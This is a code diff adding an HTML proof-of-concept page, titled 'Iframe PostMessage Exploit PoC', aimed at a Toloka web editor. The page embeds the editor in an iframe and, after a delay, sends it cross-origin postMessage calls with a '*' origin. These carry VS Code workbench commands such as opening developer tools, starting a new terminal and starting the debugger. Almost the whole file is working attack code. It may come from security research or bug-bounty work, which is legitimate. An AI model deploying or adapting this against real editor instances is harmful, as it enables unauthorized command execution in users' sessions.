@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Iframe PostMessage Exploit PoC</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #111;
+      color: #0f0;
+      text-align: center;
+      margin-top: 50px;
+    }
+    iframe {
+      width: 100%;
+      height: 600px;
+      border: 2px solid #0f0;
+    }
+  </style>
+</head>
+<body>
+  <h1>⚡ PoC: Toloka Editor iframe Exploit</h1>
+  <p>يتم الآن إرسال أمر حساس إلى النافذة الأم...</p>
+  <iframe id="editor-frame" src="https://tb.toloka.dev/editor?config=..." sandbox="allow-scripts allow-same-origin"></iframe>
+
+  <script>
+    const iframe = document.getElementById("editor-frame");
+
+    iframe.addEventListener("load", () => {
+      console.log("✅ iframe loaded, sending crafted message...");
+
+      // Delay to ensure iframe is fully ready
+      setTimeout(() => {
+        const commands = [
+          "webview.openDeveloperTools",
+          "notebook.cell.clearOutputs",
+          "workbench.action.toggleDevTools",
+          "workbench.view.remote",
+          "workbench.action.debug.start",
+          "workbench.action.terminal.new",
+          "workbench.view.explorer"
+        ];
+
+        for (const cmd of commands) {
+          iframe.contentWindow.postMessage({
+            vscodeMessage: {
+              command: cmd,
+              arguments: []
+            }
+          }, "*");
+        }
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
